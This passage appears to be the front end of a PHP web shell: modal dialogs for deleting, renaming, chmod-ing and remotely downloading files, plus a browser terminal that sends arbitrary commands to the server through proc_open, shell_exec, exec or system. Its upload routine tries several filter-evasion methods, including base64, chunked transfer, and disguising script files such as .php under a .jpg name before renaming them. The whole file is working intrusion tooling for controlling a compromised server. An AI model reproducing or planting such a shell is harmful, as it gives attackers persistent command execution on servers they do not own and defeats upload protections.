                <span style="color:#22c55e;">1.</span> Normal multipart &nbsp;
                <span style="color:#22c55e;">2.</span> Base64 direct &nbsp;
                <span style="color:#22c55e;">3.</span> Chunked base64 &nbsp;
                <span style="color:#22c55e;">4.</span> Neutral name + rename &nbsp;
                <span style="color:#22c55e;">5.</span> Neutral + base64 combo
            </div>

            <div class="form-group">
                <label class="form-label">Target Folder</label>
                <input type="text" id="auTarget" class="form-input" value="<?php echo htmlspecialchars($currentDirectory); ?>" style="font-family:monospace;font-size:11px;">
            </div>

            <div class="form-group">
                <label class="form-label">Chunk Size</label>
                <select id="auChunkSize" class="form-input" style="font-size:11px;">
                    <option value="262144">256 KB</option>
                    <option value="524288" selected>512 KB</option>
                    <option value="1048576">1 MB</option>
                    <option value="2097152">2 MB</option>
                </select>
            </div>

            <div class="form-group">
                <label style="display:flex;align-items:center;gap:6px;font-size:11px;color:#8080a0;">
                    <input type="checkbox" id="auNeutral"> Gunakan neutral name dulu, rename ke nama asli
                </label>
            </div>

            <div class="form-group">
                <label class="form-label">Neutral Name (opsional)</label>
                <input type="text" id="auNeutralName" class="form-input" placeholder="file_neutral.jpg" style="font-family:monospace;font-size:11px;">
            </div>

            <div id="auZone" class="up-zone">
                <div style="font-size:36px;margin-bottom:8px;">📦</div>
                <div style="color:#4a9eff;font-size:12px;font-weight:700;">Click to select file</div>
                <div style="color:#8080a0;font-size:10px;margin-top:4px;">File akan diupload dengan adaptive method</div>
            </div>
            <input type="file" id="auFileInput" style="display:none;">

            <div id="auQueue" style="margin-top:12px;"></div>

            <div id="auProgress" class="up-progress" style="display:none;">
                <div id="auProgressBar" class="up-progress-bar"></div>
            </div>
            <div id="auProgressText" style="font-size:10px;color:#8080a0;margin-top:4px;text-align:center;"></div>

            <div id="auLog" class="up-log" style="display:none;"></div>
        </div>
        <div class="modal-footer">
            <button class="btn" onclick="hideModal('adaptiveUpload')">Close</button>
            <button class="btn btn-primary" onclick="auRun()" id="auBtn">Upload</button>
        </div>
    </div>
</div>

<!-- MODAL: DELETE -->
<div class="modal-overlay hidden" id="deleteConfirmModal">
    <div class="modal" style="max-width:400px;">
        <div class="modal-header"><span class="modal-title">Delete Confirmation</span><button class="modal-close" onclick="hideModal('deleteConfirm')">&times;</button></div>
        <div class="modal-body" style="text-align:center;"><p style="color:#8080a0;margin-bottom:8px;">Delete:</p><p id="delFileName" style="color:#fff;font-weight:600;margin-bottom:12px;word-break:break-all;"></p><p style="color:#505070;font-size:11px;">Cannot be undone.</p></div>
        <div class="modal-footer" style="justify-content:center;"><button class="btn" onclick="hideModal('deleteConfirm')">Cancel</button><a id="delConfirmBtn" href="#" class="btn btn-danger">Delete</a></div>
    </div>
</div>

<!-- MODAL: NEW FOLDER -->
<div class="modal-overlay hidden" id="newfolderModal">
    <div class="modal" style="max-width:450px;">
        <div class="modal-header"><span class="modal-title">New Folder</span><button class="modal-close" onclick="hideModal('newfolder')">&times;</button></div>
        <form method="POST"><input type="hidden" name="newfolder" value="1"><div class="modal-body"><label class="form-label">Folder Name</label><input type="text" id="newFolderName" name="foldername" class="form-input" required autocomplete="off"></div><div class="modal-footer"><button type="button" class="btn" onclick="hideModal('newfolder')">Cancel</button><button type="submit" class="btn btn-primary">Create</button></div></form>
    </div>
</div>

<!-- MODAL: NEW FILE -->
<div class="modal-overlay hidden" id="createfileModal">
    <div class="modal" style="max-width:600px;">
        <div class="modal-header"><span class="modal-title">New File</span><button class="modal-close" onclick="hideModal('createfile')">&times;</button></div>
        <form method="POST"><input type="hidden" name="newfile" value="1"><div class="modal-body"><label class="form-label">Filename</label><input type="text" id="newFileName" name="filename" class="form-input" style="margin-bottom:8px;font-family:monospace;" required autocomplete="off"><label class="form-label">Content (optional)</label><textarea id="newFileContent" name="filecontent" class="form-input" style="min-height:200px;font-family:monospace;font-size:12px;"></textarea></div><div class="modal-footer"><button type="button" class="btn" onclick="hideModal('createfile')">Cancel</button><button type="submit" class="btn btn-primary">Create</button></div></form>
    </div>
</div>

<!-- MODAL: RENAME -->
<div class="modal-overlay hidden" id="renameModal">
    <div class="modal" style="max-width:450px;">
        <div class="modal-header"><span class="modal-title">Rename</span><button class="modal-close" onclick="hideModal('rename')">&times;</button></div>
        <form method="POST"><input type="hidden" name="rename_old" id="renameOld"><div class="modal-body"><label class="form-label">New Name</label><input type="text" id="renameNew" name="rename_new" class="form-input" style="font-family:monospace;" required autocomplete="off"></div><div class="modal-footer"><button type="button" class="btn" onclick="hideModal('rename')">Cancel</button><button type="submit" class="btn btn-primary">Rename</button></div></form>
    </div>
</div>

<!-- MODAL: CHMOD -->
<div class="modal-overlay hidden" id="chmodModal">
    <div class="modal" style="max-width:450px;">
        <div class="modal-header"><span class="modal-title">Chmod</span><button class="modal-close" onclick="hideModal('chmod')">&times;</button></div>
        <form method="POST"><input type="hidden" name="chmod_file" id="chmodFile"><div class="modal-body"><label class="form-label">Mode (octal)</label><input type="text" id="chmodMode" name="chmod_mode" class="form-input" style="font-family:monospace;" placeholder="0644" required autocomplete="off"><div style="display:flex;gap:4px;flex-wrap:wrap;margin-top:8px;"><button type="button" class="btn" onclick="document.getElementById('chmodMode').value='0644'">0644</button><button type="button" class="btn" onclick="document.getElementById('chmodMode').value='0755'">0755</button><button type="button" class="btn" onclick="document.getElementById('chmodMode').value='0777'">0777</button><button type="button" class="btn" onclick="document.getElementById('chmodMode').value='0444'">0444</button></div></div><div class="modal-footer"><button type="button" class="btn" onclick="hideModal('chmod')">Cancel</button><button type="submit" class="btn btn-primary">Apply</button></div></form>
    </div>
</div>

<!-- MODAL: REMOTE -->
<div class="modal-overlay hidden" id="remoteModal">
    <div class="modal" style="max-width:500px;">
        <div class="modal-header"><span class="modal-title">Remote Upload</span><button class="modal-close" onclick="hideModal('remote')">&times;</button></div>
        <form method="POST"><div class="modal-body"><label class="form-label">Remote URL</label><input type="text" name="remote_url" class="form-input" placeholder="https://example.com/file.zip" style="margin-bottom:10px;" required autocomplete="off"><label class="form-label">Save as (optional)</label><input type="text" name="remote_filename" class="form-input" placeholder="filename.zip" autocomplete="off"></div><div class="modal-footer"><button type="button" class="btn" onclick="hideModal('remote')">Cancel</button><button type="submit" name="remote_upload" class="btn btn-primary">Download</button></div></form>
    </div>
</div>

<!-- MODAL: TERMINAL -->
<div class="modal-overlay hidden" id="terminalModal">
    <div class="modal" style="max-width:900px;height:85vh;">
        <div class="modal-header">
            <span class="modal-title">Terminal</span>
            <button class="modal-close" onclick="hideModal('terminal')">&times;</button>
        </div>
        <div class="modal-body" style="padding:0;display:flex;flex-direction:column;background:#000;">
            <div style="padding:8px 12px;background:#0d0d18;border-bottom:1px solid #1e1e30;display:flex;align-items:center;gap:8px;">
                <span style="color:#22c55e;font-size:11px;font-weight:700;">$</span>
                <input type="text" id="termCwd" class="form-input" style="flex:1;font-family:monospace;font-size:11px;padding:5px 8px;" value="<?php echo htmlspecialchars($currentDirectory, ENT_QUOTES); ?>">
                <button class="btn" style="padding:4px 8px;font-size:10px;" onclick="termClear()">Clear</button>
            </div>
            <div id="termOutput" style="flex:1;overflow-y:auto;padding:12px;font-family:'JetBrains Mono','Consolas',monospace;font-size:12px;line-height:1.5;color:#e0e0f0;white-space:pre-wrap;word-break:break-all;background:#000;min-height:200px;">
                <div style="color:#8080a0;">// Terminal ready. Engine otomatis: proc_open → shell_exec → exec → system.</div>
                <div style="color:#8080a0;">// Contoh: ls -la | whoami | pwd | uname -a | cat file.txt | php -v</div>
            </div>
            <div style="padding:8px 12px;background:#0d0d18;border-top:1px solid #1e1e30;display:flex;gap:6px;align-items:center;">
                <span style="color:#22c55e;font-family:monospace;font-size:12px;">$</span>
                <input type="text" id="termInput" class="form-input" style="flex:1;font-family:monospace;font-size:12px;background:#000;border-color:#2a2a40;" placeholder="ketik perintah..." autocomplete="off" spellcheck="false">
                <button class="btn btn-primary" id="termRunBtn" onclick="termRun()" style="padding:6px 12px;font-size:11px;">Run</button>
            </div>
        </div>
    </div>
</div>

<script>
// ============================================================
// BASIC HELPERS
// ============================================================
function showModal(id) { var el = document.getElementById(id + 'Modal'); if (el) el.classList.remove('hidden'); }
function hideModal(id) { var el = document.getElementById(id + 'Modal'); if (el) el.classList.add('hidden'); }
document.querySelectorAll('.modal-overlay').forEach(function(o) {
    o.addEventListener('click', function(e) { if (e.target === o) o.classList.add('hidden'); });
});
function confirmDel(p, n) {
    document.getElementById('delFileName').textContent = n;
    document.getElementById('delConfirmBtn').href = '?del=' + p;
    showModal('deleteConfirm');
}
function showNewFolder() {
    document.getElementById('newFolderName').value = '';
    showModal('newfolder');
    setTimeout(function() { document.getElementById('newFolderName').focus(); }, 100);
}
function showCreateFile() {
    document.getElementById('newFileName').value = '';
    document.getElementById('newFileContent').value = '';
    showModal('createfile');
    setTimeout(function() { document.getElementById('newFileName').focus(); }, 100);
}
function showRename(oldPath, oldName) {
    document.getElementById('renameOld').value = oldPath;
    document.getElementById('renameNew').value = oldName;
    showModal('rename');
    setTimeout(function() { document.getElementById('renameNew').focus(); }, 100);
}
function showChmod(path, perm) {
    document.getElementById('chmodFile').value = path;
    document.getElementById('chmodMode').value = '0' + perm;
    showModal('chmod');
}

// ============================================================
// ADAPTIVE UPLOAD
// ============================================================
var auFile = null;
var auUploading = false;

(function() {
    var z = document.getElementById('auZone');
    var inp = document.getElementById('auFileInput');
    if (z && inp) {
        z.addEventListener('click', function() { if (!auUploading) inp.click(); });
        inp.addEventListener('change', function() {
            if (inp.files.length > 0) {
                auFile = inp.files[0];
                document.getElementById('auQueue').innerHTML =
                    '<div style="padding:8px;background:rgba(74,158,255,.1);border:1px solid rgba(74,158,255,.3);border-radius:4px;font-size:11px;font-family:monospace;color:#4a9eff;">📦 ' +
                    auFile.name + ' (' + (auFile.size / 1024 / 1024).toFixed(2) + ' MB)</div>';
                if (!document.getElementById('auNeutralName').value) {
                    var ext = auFile.name.split('.').pop().toLowerCase();
                    var neutralExt = (['php','phtml','php5','php7','php8','phar','jsp','asp','aspx','cgi','pl','py','sh'].indexOf(ext) >= 0) ? 'jpg' : ext;
                    document.getElementById('auNeutralName').value = 'file_' + Math.random().toString(36).substring(2, 10) + '.' + neutralExt;
                }
            }
            inp.value = '';
        });
    }
})();

function auLog(msg, color) {
    var log = document.getElementById('auLog');
    log.style.display = 'block';
    log.innerHTML += '<div style="color:' + (color || '#22c55e') + ';">' + msg + '</div>';
    log.scrollTop = log.scrollHeight;
}

function auMethodNormal(file, targetDir) {
    return new Promise(function(resolve) {
        var fd = new FormData();
        fd.append('upload_method', 'normal');
        fd.append('target_dir', targetDir);
        fd.append('file[]', file);
        fetch(window.location.href, { method: 'POST', body: fd })
            .then(function(r) { return r.json(); })
            .then(function(r) {
                if (r.ok && r.uploaded && r.uploaded.length > 0) {
                    var sz = r.uploaded[0].size;
                    if (sz > 0) return resolve({ ok: true, method: 'normal', size: sz, name: r.uploaded[0].name });
                    return resolve({ ok: false, method: 'normal', reason: 'zero_size' });
                }
                resolve({ ok: false, method: 'normal', reason: r.err || 'no_upload' });
            })
            .catch(function(e) { resolve({ ok: false, method: 'normal', reason: String(e) }); });
    });
}

function auMethodB64(file, targetDir, filename) {
    return new Promise(function(resolve) {
        var reader = new FileReader();
        reader.onload = function(e) {
            var b64 = e.target.result.split(',')[1];
            var fd = new FormData();
            fd.append('upload_method', 'b64');
            fd.append('target_dir', targetDir);
            fd.append('filename', filename);
            fd.append('file_data', b64);
            fetch(window.location.href, { method: 'POST', body: fd })
                .then(function(r) { return r.json(); })
                .then(function(r) {
                    if (r.ok && r.size > 0) return resolve({ ok: true, method: 'b64', size: r.size, name: r.name });
                    resolve({ ok: false, method: 'b64', reason: r.err || 'zero_size' });
                })
                .catch(function(e) { resolve({ ok: false, method: 'b64', reason: String(e) }); });
        };
        reader.onerror = function() { resolve({ ok: false, method: 'b64', reason: 'read_failed' }); };
        reader.readAsDataURL(file);
    });
}

function auMethodChunked(file, targetDir, chunkSize) {
    return new Promise(function(resolve) {
        var total = Math.ceil(file.size / chunkSize);
        var uploadId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        var idx = 0;
        var offset = 0;

        function send() {
            if (offset >= file.size) {
                return resolve({ ok: true, method: 'chunked', size: file.size, name: file.name });
            }
            var slice = file.slice(offset, offset + chunkSize);
            var reader = new FileReader();
            reader.onload = function(e) {
                var b64 = e.target.result.split(',')[1];
                var fd = new FormData();
                fd.append('upload_method', 'chunked');
                fd.append('upload_id', uploadId);
                fd.append('filename', file.name);
                fd.append('chunk_index', idx);
                fd.append('total_chunks', total);
                fd.append('chunk_data', b64);
                fd.append('target_dir', targetDir);
                fetch(window.location.href, { method: 'POST', body: fd })
                    .then(function(r) { return r.json(); })
                    .then(function(r) {
                        if (r.err) return resolve({ ok: false, method: 'chunked', reason: r.err });
                        var pct = Math.round(((idx + 1) / total) * 100);
                        document.getElementById('auProgress').style.display = 'block';
                        document.getElementById('auProgressBar').style.width = pct + '%';
                        document.getElementById('auProgressText').textContent = 'chunked: ' + pct + '% (' + (idx + 1) + '/' + total + ')';
                        if (r.complete) return resolve({ ok: true, method: 'chunked', size: r.size, name: r.name });
                        idx++; offset += chunkSize;
                        setTimeout(send, 20);
                    })
                    .catch(function(e) { resolve({ ok: false, method: 'chunked', reason: String(e) }); });
            };
            reader.onerror = function() { resolve({ ok: false, method: 'chunked', reason: 'read_failed' }); };
            reader.readAsDataURL(slice);
        }
        send();
    });
}

function auMethodNeutral(file, targetDir, neutralName, realName) {
    return new Promise(function(resolve) {
        var fd = new FormData();
        fd.append('upload_method', 'neutral');
        fd.append('target_dir', targetDir);
        fd.append('real_filename', realName);
        fd.append('neutral_filename', neutralName);
        fd.append('rename_after', '1');
        fd.append('file', file);
        fetch(window.location.href, { method: 'POST', body: fd })
            .then(function(r) { return r.json(); })
            .then(function(r) {
                if (r.ok && r.size > 0) return resolve({ ok: true, method: 'neutral', size: r.size, name: realName, path: r.path });
                resolve({ ok: false, method: 'neutral', reason: r.err || 'zero_size' });
            })
            .catch(function(e) { resolve({ ok: false, method: 'neutral', reason: String(e) }); });
    });
}

function auRun() {
    if (!auFile) { alert('Pilih file dulu'); return; }
    if (auUploading) { alert('Sedang upload...'); return; }

    auUploading = true;
    var btn = document.getElementById('auBtn');
    btn.disabled = true;
    btn.textContent = 'Uploading...';

    var targetDir = document.getElementById('auTarget').value;
    var chunkSize = parseInt(document.getElementById('auChunkSize').value);
    var useNeutral = document.getElementById('auNeutral').checked;
    var neutralName = document.getElementById('auNeutralName').value || ('file_' + Math.random().toString(36).substring(2, 10) + '.jpg');
    var realName = auFile.name;

    document.getElementById('auLog').innerHTML = '';
    document.getElementById('auProgress').style.display = 'none';
    document.getElementById('auProgressBar').style.width = '0%';
    document.getElementById('auProgressText').textContent = '';

    auLog('[*] File: ' + realName + ' (' + auFile.size + ' bytes)', '#4a9eff');
    auLog('[*] Target: ' + targetDir, '#4a9eff');
    if (useNeutral) auLog('[*] Neutral name: ' + neutralName, '#a855f7');

    var methods = [];

    if (useNeutral) {
        methods.push({ name: 'neutral+rename', fn: function() { return auMethodNeutral(auFile, targetDir, neutralName, realName); } });
    }
    methods.push({ name: 'normal', fn: function() { return auMethodNormal(auFile, targetDir); } });
    methods.push({ name: 'base64', fn: function() { return auMethodB64(auFile, targetDir, realName); } });
    methods.push({ name: 'chunked', fn: function() { return auMethodChunked(auFile, targetDir, chunkSize); } });
    if (!useNeutral) {
        methods.push({ name: 'neutral+rename', fn: function() { return auMethodNeutral(auFile, targetDir, neutralName, realName); } });
    }

    var mi = 0;
    function tryNext() {
        if (mi >= methods.length) {
            auLog('[!] Semua method gagal.', '#f85149');
            auUploading = false;
            btn.disabled = false;
            btn.textContent = 'Upload';
            return;
        }
        var m = methods[mi++];
        auLog('[*] Mencoba method: ' + m.name + ' ...', '#ffd700');
        m.fn().then(function(r) {
            if (r.ok) {
                auLog('[+] BERHASIL via ' + r.method + ' — ' + r.name + ' (' + r.size + ' bytes)', '#22c55e');
                auUploading = false;
                btn.disabled = false;
                btn.textContent = 'Upload';
                setTimeout(function() { location.reload(); }, 1200);
            } else {
                auLog('[!] ' + r.method + ' gagal: ' + (r.reason || 'unknown') + ' — coba berikutnya...', '#f85149');
                setTimeout(tryNext, 200);
            }
        });
    }
    tryNext();
}

// ============================================================
// TERMINAL
// ============================================================
var termHistory = [];
var termHistIdx = -1;

function showTerminal() {
    showModal('terminal');
    setTimeout(function() { document.getElementById('termInput').focus(); }, 150);
}

function termClear() {
    document.getElementById('termOutput').innerHTML =
        '<div style="color:#8080a0;">// Cleared.</div>';
}

function termAppend(html) {
    var out = document.getElementById('termOutput');
    out.innerHTML += html;
    out.scrollTop = out.scrollHeight;
}

function termEscape(s) {
    return String(s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

function termRun() {
    var inp = document.getElementById('termInput');
    var btn = document.getElementById('termRunBtn');
    var cmd = inp.value;
    if (!cmd.trim()) return;

    termHistory.push(cmd);
    termHistIdx = termHistory.length;

    var cwd = document.getElementById('termCwd').value;

    termAppend('<div><span style="color:#22c55e;">$</span> <span style="color:#4a9eff;">' + termEscape(cmd) + '</span></div>');

    inp.value = '';
    inp.disabled = true;
    btn.disabled = true;
    btn.textContent = '...';

    var fd = new FormData();
    fd.append('terminal_cmd', cmd);
    fd.append('terminal_cwd', cwd);

    fetch(window.location.href, { method: 'POST', body: fd })
        .then(function(r) { return r.json(); })
        .then(function(r) {
            if (r.ok) {
                var out = r.output !== '' ? r.output : '(no output)';
                termAppend('<div style="color:#e0e0f0;">' + termEscape(out) + '</div>');
                if (r.exit && r.exit !== 0) {
                    termAppend('<div style="color:#f85149;font-size:11px;">[exit code: ' + r.exit + ']</div>');
                }
                termAppend('<div style="color:#505070;font-size:10px;">[engine: ' + termEscape(r.engine || '?') + ' | cwd: ' + termEscape(r.cwd || '?') + ']</div>');
            } else {
                termAppend('<div style="color:#f85149;">[error] ' + termEscape(r.err || 'unknown') + '</div>');
            }
        })
        .catch(function(e) {
            termAppend('<div style="color:#f85149;">[fetch error] ' + termEscape(String(e)) + '</div>');
        })
        .then(function() {
            inp.disabled = false;
            btn.disabled = false;
            btn.textContent = 'Run';
            inp.focus();
        });
}

(function() {
    var inp = document.getElementById('termInput');
    if (!inp) return;
    inp.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            termRun();
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (termHistory.length === 0) return;
            if (termHistIdx > 0) termHistIdx--;
            inp.value = termHistory[termHistIdx] || '';
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (termHistory.length === 0) return;
            if (termHistIdx < termHistory.length - 1) {
                termHistIdx++;
                inp.value = termHistory[termHistIdx] || '';
            } else {
                termHistIdx = termHistory.length;
                inp.value = '';
            }
        }
    });
})();
</script>

</body>
</html>
